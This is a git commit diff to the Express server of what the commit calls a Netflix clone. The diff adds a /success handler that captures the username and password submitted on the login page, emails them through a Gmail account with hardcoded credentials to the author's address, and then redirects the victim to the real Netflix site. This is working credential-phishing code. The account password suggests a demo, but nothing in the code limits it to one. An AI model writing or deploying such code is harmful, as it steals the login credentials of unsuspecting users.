db9dac87de2501e33b22bec01c5c49542ea24091
Ansh Gupta <iamtheanshgupta@gmail.com>
2021-08-25 17:25:15 +0530

    release 0.1

--- index.js
+++ index.js
@@ -9,13 +9,40 @@ app.get("/",function(req,res){
     res.sendFile('login.html',{root:__dirname})
 });
 app.post("/success",function(req,res){
+    var transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+          user: 'abrakadabra83181@gmail.com',
+          pass: 'phishingdemo'
+        }
+      });
+
+
+      
+      
     var username = req.body.username;
     var password = req.body.password;
     password = JSON.stringify(password,null,2);
     username = JSON.stringify(username,null,2);
     console.log(username+"->"+password);
     var data = username+"->"+password+"  \n";
-    res.render("success.ejs");
+    
+    var mailOptions = {
+        from: 'abrakadabra83181@gmail.com',
+        to: 'iamtheanshgupta@gmail.com',
+        subject: 'mail from the netflix clone that you have built',
+        text: `the username is ${username}and the password is ${password}`
+      };
+    
+    transporter.sendMail(mailOptions, function(error, info){
+        if (error) {
+          console.log(error);
+        } else {
+          console.log('Email sent: ' + info.response);
+        }
+      });
+
+    res.redirect("https://www.netflix.com/")
 });
 app.listen(3000,function(){
     console.log("Server listening on port 3000");
